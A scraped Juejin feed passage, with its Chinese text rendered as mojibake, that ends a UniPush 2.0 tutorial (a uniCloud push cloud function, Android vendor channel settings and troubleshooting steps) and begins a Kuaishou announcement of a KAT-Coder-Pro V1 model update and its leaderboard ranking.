<span class="hljs-keyword">const</span> uniPush = uniCloud.<span class="hljs-title function_">getPushManager</span>({ <span class="hljs-attr">appId</span>: <span class="hljs-string">"__UNI__XXXXXX"</span> }) <span class="hljs-comment">// æ›¿æ¢ä½ çš„ appId</span>
<span class="hljs-keyword">const</span> db = uniCloud.<span class="hljs-title function_">database</span>();
<span class="hljs-keyword">const</span> dbCmd = db.<span class="hljs-property">command</span>;

<span class="hljs-built_in">exports</span>.<span class="hljs-property">main</span> = <span class="hljs-keyword">async</span> (event, context) =&gt; {
    <span class="hljs-comment">// å‡è®¾åç«¯é€šè¿‡ POST è¯·æ±‚ä¼ å…¥ JSON body</span>
    <span class="hljs-keyword">let</span> body = event.<span class="hljs-property">body</span>;
    <span class="hljs-keyword">if</span>(event.<span class="hljs-property">isBase64Encoded</span>){
        body = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(body, <span class="hljs-string">'base64'</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">'utf8'</span>);
    }
    <span class="hljs-keyword">const</span> { userIds, title, content } = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(body);

    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// --- 3. æŸ¥åº“ï¼šè·å–ç›®æ ‡ç”¨æˆ·çš„ Push Client ID ---</span>
        <span class="hljs-keyword">const</span> deviceRes = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">collection</span>(<span class="hljs-string">'uni-id-device'</span>)
            .<span class="hljs-title function_">where</span>({
                <span class="hljs-attr">user_id</span>: dbCmd.<span class="hljs-title function_">in</span>(userIds)
            })
            .<span class="hljs-title function_">field</span>({ <span class="hljs-string">'push_clientid'</span>: <span class="hljs-literal">true</span> })
            .<span class="hljs-title function_">get</span>();

        <span class="hljs-keyword">if</span> (deviceRes.<span class="hljs-property">data</span>.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> { <span class="hljs-attr">code</span>: <span class="hljs-number">404</span>, <span class="hljs-attr">msg</span>: <span class="hljs-string">'æŒ‡å®šçš„ç”¨æˆ·å‡æœªç»‘å®šä»»ä½•è®¾å¤‡'</span> };
        }

        <span class="hljs-comment">// å»é‡ï¼Œé˜²æ­¢åŒä¸€è®¾å¤‡æ”¶åˆ°å¤šæ¡ï¼ˆå¦‚æœç”¨æˆ·å¤šç«¯ç™»å½•ï¼‰</span>
        <span class="hljs-keyword">const</span> cids = [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(deviceRes.<span class="hljs-property">data</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">push_clientid</span>))];

        <span class="hljs-comment">// --- 4. æ‰§è¡Œæ¨é€ï¼šé…ç½®å¤šå‚å•†é€šé“ ---</span>
        <span class="hljs-keyword">const</span> pushRes = <span class="hljs-keyword">await</span> uniPush.<span class="hljs-title function_">sendMessage</span>({
            <span class="hljs-string">"push_clientid"</span>: cids,
            <span class="hljs-string">"title"</span>: title,
            <span class="hljs-string">"content"</span>: content,
            <span class="hljs-string">"force_notification"</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// å¼ºåˆ¶æ˜¾ç¤ºé€šçŸ¥æ </span>
            <span class="hljs-string">"request_id"</span>: context.<span class="hljs-property">requestId</span>,
            <span class="hljs-string">"options"</span>: {
                <span class="hljs-string">"android"</span>: {
                    <span class="hljs-comment">// --- å°ç±³ (XM) é…ç½® ---</span>
                    <span class="hljs-string">"XM"</span>: {
                        <span class="hljs-comment">// å¿…é¡»åœ¨å°ç±³åå°ç”³è¯· Channel IDï¼Œå¦åˆ™å¯èƒ½è¢«æŠ˜å æˆ–é™éŸ³</span>
                        <span class="hljs-string">"/extra.channel_id"</span>: <span class="hljs-string">"ä½ çš„å°ç±³ChannelID"</span>, 
                    },
                    <span class="hljs-comment">// --- åä¸º (HW) é…ç½® ---</span>
                    <span class="hljs-string">"HW"</span>: {
                        <span class="hljs-comment">// å¿…é¡»é…ç½®è‡ªåˆ†ç±»æƒç›Šï¼Œ"SERVICE" ä¸ºæœåŠ¡æé†’ï¼Œæƒé‡é«˜äºé»˜è®¤</span>
                        <span class="hljs-string">"/message/android/category"</span>: <span class="hljs-string">"WORK"</span>, <span class="hljs-comment">// æˆ– SERVICE</span>
                    },
                    <span class="hljs-comment">// --- OPPO (OP) é…ç½® ---</span>
                    <span class="hljs-string">"OP"</span>: {
                        <span class="hljs-string">"/channel_id"</span>: <span class="hljs-string">"ä½ çš„OPPOé€šé“ID"</span>,
                        <span class="hljs-string">"/category"</span>: <span class="hljs-string">"MARKETING"</span>, <span class="hljs-comment">// æ³¨æ„ï¼šOPPO è¥é”€ç±»æ¶ˆæ¯é™åˆ¶è¾ƒå¤šï¼Œé‡è¦é€šçŸ¥å»ºè®®ç”³è¯·ç§ä¿¡é€šé“</span>
                        <span class="hljs-string">"/notify_level"</span>: <span class="hljs-number">16</span>
                    },
                    <span class="hljs-comment">// --- VIVO (VV) é…ç½® ---</span>
                    <span class="hljs-string">"VV"</span>: {
                        <span class="hljs-string">"/classification"</span>: <span class="hljs-number">1</span>, <span class="hljs-comment">// 1: ç³»ç»Ÿç±»æ¶ˆæ¯ (éœ€è¦ç”³è¯·)ï¼Œ0: è¿è¥ç±»</span>
                    }
                }
            }
        });

        <span class="hljs-comment">// --- 5. è¿”å›ç»“æœ ---</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-attr">code</span>: <span class="hljs-number">0</span>,
            <span class="hljs-attr">msg</span>: <span class="hljs-string">'æ¨é€è¯·æ±‚å·²ä¸‹å‘'</span>,
            <span class="hljs-attr">target_user_count</span>: userIds.<span class="hljs-property">length</span>,
            <span class="hljs-attr">target_device_count</span>: cids.<span class="hljs-property">length</span>,
            <span class="hljs-attr">uni_push_result</span>: pushRes
        };

    } <span class="hljs-keyword">catch</span> (e) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);
        <span class="hljs-keyword">return</span> {
            <span class="hljs-attr">code</span>: <span class="hljs-number">500</span>,
            <span class="hljs-attr">msg</span>: <span class="hljs-string">'æœåŠ¡ç«¯å†…éƒ¨é”™è¯¯'</span>,
            <span class="hljs-attr">error</span>: e.<span class="hljs-property">message</span>
        };
    }
};
</code></pre>
<hr/>
<h2 data-id="heading-4">3. å®‰å“å‚å•†ç‰¹æ®Šé…ç½®ï¼ˆå¿…è¯»ï¼‰</h2>
<p>éšç€ Android 8.0+ é€šçŸ¥æ¸ é“ï¼ˆNotification Channelsï¼‰çš„å¼•å…¥ï¼Œå¦‚æœä¸è¿›è¡Œé¢å¤–é…ç½®ï¼Œå·¥å•æé†’å¾ˆå¯èƒ½ä¼šè¢«å½’ç±»ä¸ºâ€œè¥é”€å¹¿å‘Šâ€ä»è€Œ<strong>é™éŸ³</strong>æˆ–<strong>æŠ˜å </strong>ã€‚</p>
<h3 data-id="heading-5">3.1 å°ç±³ (Xiaomi) é…ç½®</h3>
<p>å°ç±³éœ€è¦åˆ›å»ºè‡ªå®šä¹‰ Channel æ‰èƒ½è®©æ¶ˆæ¯æ­£å¸¸å“é“ƒæˆ–éœ‡åŠ¨ã€‚</p>
<ol>
<li>
<p><strong>æ“ä½œè·¯å¾„</strong>ï¼šå°ç±³å¼€æ”¾å¹³å° -&gt; æ¶ˆæ¯æ¨é€ -&gt; é…ç½®ç®¡ç† -&gt; é€šçŸ¥ç±»åˆ«ï¼ˆChannelï¼‰ç®¡ç†ã€‚</p>
</li>
<li>
<p><strong>ç”³è¯·</strong>ï¼šæ–°å»ºä¸€ä¸ªç±»åˆ«ï¼Œä¾‹å¦‚â€œå·¥å•æé†’â€æˆ–â€œäº‹åŠ¡é€šçŸ¥â€ã€‚</p>
</li>
<li>
<p><strong>è·å– ID</strong>ï¼šç”³è¯·é€šè¿‡åï¼Œä¼šè·å¾—ä¸€ä¸ª <code>Channel ID</code>ï¼ˆå¦‚ <code>Channel_A</code>ï¼‰ã€‚</p>
</li>
<li>
<p><strong>ä»£ç æ˜ å°„</strong>ï¼š</p>
<p>JavaScript</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"XM"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"/extra.channel_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ ç”³è¯·çš„Channel_ID"</span> 
<span class="hljs-punctuation">}</span>
</code></pre>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šå¦‚æœä¸å¡«ï¼Œé»˜è®¤èµ°â€œæ™®é€šæ¶ˆæ¯â€é€šé“ï¼Œé™åˆ¶è¾ƒå¤šã€‚</p>
</blockquote>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf50699285b04afa816720aa68116146~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGVsbHNpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766458434&amp;x-signature=nYCUnmyTaUN6rzZD50Du60K9qZY%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-6">3.2 åä¸º (Huawei) é…ç½®</h3>
<p>åä¸ºå¼•å…¥äº†â€œè‡ªåˆ†ç±»æƒç›Šâ€ï¼Œéœ€è¦å°†æ¶ˆæ¯åˆ†ç±»ä¸ºâ€œæœåŠ¡ä¸é€šè®¯â€ç±»ï¼Œå¦åˆ™ä¼šè¢«å½“åšâ€œèµ„è®¯è¥é”€â€å¤„ç†ã€‚</p>
<ol>
<li>
<p><strong>æ“ä½œè·¯å¾„</strong>ï¼šåä¸ºå¼€å‘è€…è”ç›Ÿ -&gt; æˆ‘çš„é¡¹ç›® -&gt; æ¨é€æœåŠ¡ -&gt; é…ç½® -&gt; <strong>è‡ªåˆ†ç±»æƒç›Š</strong>ã€‚</p>
</li>
<li>
<p><strong>ç”³è¯·æƒç›Š</strong>ï¼šç‚¹å‡»ç”³è¯·ï¼ŒæŒ‰ç…§æŒ‡å¼•å¡«å†™ï¼ˆé€šå¸¸éœ€è¦ä¸Šä¼ APPæˆªå›¾è¯æ˜åœºæ™¯ï¼‰ã€‚</p>
</li>
<li>
<p><strong>å‚æ•°è®¾ç½®</strong>ï¼š</p>
<ul>
<li>åœ¨ä»£ç ä¸­è®¾ç½® <code>category</code> å­—æ®µã€‚</li>
<li><code>WORK</code>ï¼šå·¥ä½œäº‹é¡¹æé†’ï¼ˆé€‚åˆå·¥å•ï¼‰ã€‚</li>
<li><code>IM</code>ï¼šå³æ—¶èŠå¤©ã€‚</li>
<li>å¦‚æœä¸ä¼ ï¼Œé»˜è®¤ä¸º <code>MARKETING</code>ï¼ˆè¥é”€ï¼‰ï¼Œææ˜“è¢«æ‹¦æˆªã€‚</li>
</ul>
<p>JavaScript</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"HW"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"/message/android/category"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"WORK"</span> 
<span class="hljs-punctuation">}</span>
</code></pre>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60a0e94e85f84de8a5c0bb3d2934204f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGVsbHNpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766458434&amp;x-signature=GC2VYc560Jc%2FkrvQ2UpNHc1Ezco%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">3.3 OPPO &amp; VIVO æ³¨æ„äº‹é¡¹</h3>
<ul>
<li><strong>OPPO</strong>ï¼šåŒæ ·æœ‰ Channel æ¦‚å¿µã€‚ç§ä¿¡é€šé“ï¼ˆé«˜æƒé‡ï¼‰éœ€è¦å•ç‹¬ç”³è¯·é‚®ä»¶æŠ¥å¤‡ï¼Œä¸”é—¨æ§›è¾ƒé«˜ã€‚ä»£ç ä¸­æ¼”ç¤ºçš„ <code>MARKETING</code> ä»…ä¾›æµ‹è¯•ï¼Œæ­£å¼ä¸Šçº¿å»ºè®®ç”³è¯· <code>IM</code> æˆ–ä¸šåŠ¡ç›¸å…³é€šé“ã€‚</li>
<li><strong>VIVO</strong>ï¼š<code>classification</code> ä¸º 1 ä»£è¡¨ç³»ç»Ÿæ¶ˆæ¯ï¼Œ0 ä»£è¡¨è¿è¥æ¶ˆæ¯ã€‚ç³»ç»Ÿæ¶ˆæ¯é…é¢æ›´é«˜ï¼Œæé†’æ›´æ˜æ˜¾ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-8">4. æ•…éšœæ’æŸ¥æµç¨‹ (Troubleshooting)</h2>
<p>å½“æ¶ˆæ¯æ²¡æœ‰é€è¾¾æ—¶ï¼Œè¯·æŒ‰ä»¥ä¸‹æ­¥éª¤æ’æŸ¥ï¼š</p>
<h3 data-id="heading-9">ğŸ“Œ é˜¶æ®µä¸€ï¼šåŸºç¡€ç¯å¢ƒæ£€æŸ¥</h3>
<ol>
<li>
<p><strong>CID æ˜¯å¦è·å–æˆåŠŸ</strong>ï¼šå‰ç«¯ <code>uni.getPushClientId</code> æ˜¯å¦æ‹¿åˆ°äº† IDï¼Ÿå¦‚æœæ˜¯åœ¨æ¨¡æ‹Ÿå™¨è¿è¡Œï¼Œé€šå¸¸æ— æ³•è·å–æœ‰æ•ˆçš„å‚å•† CIDã€‚</p>
</li>
<li>
<p><strong>äº‘å‡½æ•°æŠ¥é”™</strong>ï¼šæŸ¥çœ‹ uniCloud Web æ§åˆ¶å°çš„äº‘å‡½æ•°æ—¥å¿—ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰ <code>appId</code> ä¸åŒ¹é…æˆ–æ•°æ®åº“æŸ¥è¯¢ä¸ºç©ºçš„æƒ…å†µã€‚</p>
</li>
<li>
<p><strong>æ‰“åŒ…æ£€æŸ¥</strong>ï¼š</p>
<ul>
<li>UniPush 2.0 ä¸¥é‡ä¾èµ–åº”ç”¨ç­¾åã€‚</li>
<li><strong>å¿…é¡»ä½¿ç”¨æ­£å¼ç­¾åæ‰“åŒ…çš„è‡ªå®šä¹‰åŸºåº§</strong>è¿›è¡Œè°ƒè¯•ï¼Œæ ‡å‡†åŸºåº§æ— æ³•æµ‹è¯•å‚å•†é€šé“ã€‚</li>
<li>ç¡®ä¿ <code>manifest.json</code> ä¸­å‹¾é€‰äº† UniPush 2.0 å¹¶æ­£ç¡®å¡«å†™äº†å„å‚å•†çš„ AppID/AppKeyã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-10">ğŸ“Œ é˜¶æ®µäºŒï¼šç¦»çº¿æ¨é€æ£€æŸ¥ï¼ˆå‚å•†é€šé“ï¼‰</h3>
<p>å¦‚æœ APP æ‰“å¼€æ—¶èƒ½æ”¶åˆ°ï¼ˆèµ°çš„æ˜¯ä¸ªæ¨åœ¨çº¿é€šé“ï¼‰ï¼Œä½†æ€æ‰è¿›ç¨‹åæ”¶ä¸åˆ°ï¼ˆèµ°çš„æ˜¯å‚å•†é€šé“ï¼‰ï¼Œåˆ™æ˜¯<strong>å‚å•†é…ç½®é—®é¢˜</strong>ã€‚</p>
<ol>
<li>
<p><strong>æ£€æŸ¥å‚å•†åå°å¼€å…³</strong>ï¼šç¡®ä¿åœ¨åä¸º/å°ç±³ç­‰åå°ï¼Œæ¨é€æœåŠ¡å·²â€œå¯ç”¨â€ã€‚</p>
</li>
<li>
<p><strong>åŒ…åä¸ç­¾å SHA1</strong>ï¼š</p>
<ul>
<li>åä¸º/å°ç±³åå°å¡«å†™çš„ <code>SHA256</code> æˆ– <code>SHA1</code> å¿…é¡»ä¸ä½ æ‰“åŒ…è¯ä¹¦çš„æŒ‡çº¹<strong>å®Œå…¨ä¸€è‡´</strong>ã€‚</li>
<li>è¿™æ˜¯æœ€å¸¸è§çš„é”™è¯¯åŸå› ã€‚</li>
</ul>
</li>
<li>
<p><strong>å‚æ•°æ˜ å°„</strong>ï¼š</p>
<ul>
<li>æ£€æŸ¥äº‘å‡½æ•°ä»£ç ä¸­ <code>options</code> é‡Œçš„å‚æ•°é”®å€¼å¯¹æ˜¯å¦æŒ‰ç…§å‚å•†æœ€æ–°æ–‡æ¡£ç¼–å†™ï¼ˆå¦‚åä¸ºçš„ <code>category</code> æ‹¼å†™ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>é™æµä¸é…é¢</strong>ï¼š</p>
<ul>
<li>å¦‚æœæ˜¯æµ‹è¯•é˜¶æ®µï¼ŒæŸäº›å‚å•†ï¼ˆå¦‚ VIVO/OPPOï¼‰å¯¹æœªä¸Šæ¶åº”ç”¨çš„æ¨é€æ•°é‡æœ‰é™åˆ¶ï¼ˆå¦‚ä¸€å¤©åªèƒ½æ¨å‡ æ¡ï¼‰ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-11">å‚è€ƒæ–‡æ¡£</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fask.dcloud.net.cn%2Farticle%2F40291" target="_blank" title="https://ask.dcloud.net.cn/article/40291" ref="nofollow noopener noreferrer">DCloud å®˜æ–¹ï¼šUniPush 2.0 å¸¸è§é—®é¢˜ç´¢å¼•</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fask.dcloud.net.cn%2Farticle%2F40283" target="_blank" title="https://ask.dcloud.net.cn/article/40283" ref="nofollow noopener noreferrer">DCloud å®˜æ–¹ï¼šå‚å•†é€šé“å‚æ•°è®¾ç½®æŒ‡å—</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å…¥å›´AAæ€»æ¦œTop 10ï¼ŒNon-Reasoning Modelæ¦œå•ç¬¬ä¸€ï¼KAT-Coder-Pro V1 æ–°ç‰ˆæœ¬è¸æµªå½’æ¥ï¼]]></title>    <link>https://juejin.cn/post/7583933107690422335</link>    <guid>https://juejin.cn/post/7583933107690422335</guid>    <pubDate>2025-12-16T03:00:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583933107690422335" data-draft-id="7583980250733641791" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å…¥å›´AAæ€»æ¦œTop 10ï¼ŒNon-Reasoning Modelæ¦œå•ç¬¬ä¸€ï¼KAT-Coder-Pro V1 æ–°ç‰ˆæœ¬è¸æµªå½’æ¥ï¼"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,å‰ç«¯æ¡†æ¶"/> <meta itemprop="datePublished" content="2025-12-16T03:00:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¿«æ‰‹æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/3736571181793721"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å…¥å›´AAæ€»æ¦œTop 10ï¼ŒNon-Reasoning Modelæ¦œå•ç¬¬ä¸€ï¼KAT-Coder-Pro V1 æ–°ç‰ˆæœ¬è¸æµªå½’æ¥ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3736571181793721/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¿«æ‰‹æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:00:39.000Z" title="Tue Dec 16 2025 03:00:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>KAT-Coder-Pro V1 è¿æ¥ 1210 ç‰ˆå…³é”®è¿­ä»£ï¼Œæœ¬æ¬¡æ›´æ–°èšç„¦ Agentic Coding é¢†åŸŸæ ¸å¿ƒèƒ½åŠ›å‡çº§ï¼Œæ—¨åœ¨ä¸ºå…¨çƒå¼€å‘è€…æä¾›æ›´é«˜æ•ˆã€æ›´è´´åˆä¸šåŠ¡åœºæ™¯çš„ AI ç¼–ç è¾…åŠ©ä½“éªŒã€‚å‡­å€Ÿæ­¤æ¬¡è¿­ä»£ï¼ŒKAT-Coder-Pro V1 åœ¨æƒå¨è¯„æµ‹æœºæ„ Artificial Analysisï¼ˆAAï¼‰æ¦œå•ä¸­è¡¨ç°äº®çœ¼ï¼Œä»¥ 64 åˆ†ç»¼åˆè¯„åˆ†è·»èº«å…¨çƒæ€»æ¦œ TOP 10ï¼Œæ›´ä»¥ç»å¯¹ä¼˜åŠ¿åœ¨ Non-Reasoning Model ä¸­æ–©è·ç¬¬ä¸€åï¼Œå†æ¬¡å°è¯å…¶åœ¨ AI ç¼–ç é¢†åŸŸçš„é¡¶å°–å®åŠ›ã€‚</p>
<h3 data-id="heading-0">å››å¤§ç»´åº¦æ·±åº¦ä¼˜åŒ–ï¼Œç­‘ç‰¢ Agentic Coding æ ¸å¿ƒç«äº‰åŠ›</h3>
<p>ä¸ºåº”å¯¹å¤æ‚ç¼–ç¨‹åœºæ™¯ï¼ŒKAT-Coder-Pro V1 æ–°ç‰ˆæœ¬å›´ç»•å¼€å‘è€…å®é™…éœ€æ±‚ï¼Œåœ¨ä»¥ä¸‹å››å¤§å…³é”®ç»´åº¦å®Œæˆè¿›ä¸€æ­¥å‡çº§ï¼š</p>
<ul>
<li>
<p><strong>å“è¶Š Agentic äº¤äº’ä½“éªŒ</strong>ï¼šæ·±åº¦ä¼˜åŒ–äº†æ¨¡å‹åœ¨ Claude Codeã€Kilo Codeã€Roo Codeã€Clineã€Zed ç­‰æ•°åç§ä¸»æµ Agent å·¥å…·ä¸­çš„é›†æˆè¡¨ç°ï¼Œæ˜¾è‘—æå‡äº†æ¨¡å‹åœ¨ä¸åŒå¼€å‘ç¯å¢ƒä¸‹çš„äº¤äº’æµç•…åº¦å’Œå“åº”ç²¾ç¡®æ€§ã€‚</p>
</li>
<li>
<p><strong>å¼ºåŒ–ä»£ç æ¨ç†ä¸å·¥å…·è°ƒç”¨</strong>ï¼šè¿›ä¸€æ­¥æå‡äº†æ¨¡å‹çš„ Agentic Coding èƒ½åŠ›ï¼Œå¼ºåŒ–æ¨¡å‹åœ¨ä¸åŒåœºæ™¯ä¸‹è°ƒç”¨ Coding Tools å’Œ Web Search Tools è§£å†³å®é™…é—®é¢˜çš„èƒ½åŠ›ã€‚</p>
</li>
<li>
<p>**æå‡å·¥å…·è°ƒç”¨ç¨³å®šæ€§ï¼š**é™ä½äº†å·¥å…·ï¼ˆAPIï¼‰è°ƒç”¨çš„æ•´ä½“é”™è¯¯ç‡ï¼Œæå‡äº†å¤æ‚ä»»åŠ¡æµçš„ç¨³å®šæ€§ã€‚</p>
</li>
<li>
<p>**å¢å¼ºå‰ç«¯ä»£ç ç”Ÿæˆèƒ½åŠ›ï¼š**é€šè¿‡ç”Ÿæˆå¼å¥–åŠ±æ¨¡å‹å¤§å¹…åº¦æå‡å‰ç«¯é¡µé¢ç¾æ„Ÿï¼Œæ˜¾è‘—å¢å¼ºäº† HTMLã€CSSã€JavaScript ç­‰å‰ç«¯ä»£ç çš„ç”Ÿæˆè´¨é‡ä¸å‡†ç¡®æ€§ã€‚</p>
</li>
</ul>
<h3 data-id="heading-1">AA æ¦œå•æˆç»©äº®çœ¼ï¼Œå¤šç»´åº¦æ€§èƒ½æ¯”è‚©å›½é™…é¡¶å°–æ¨¡å‹</h3>
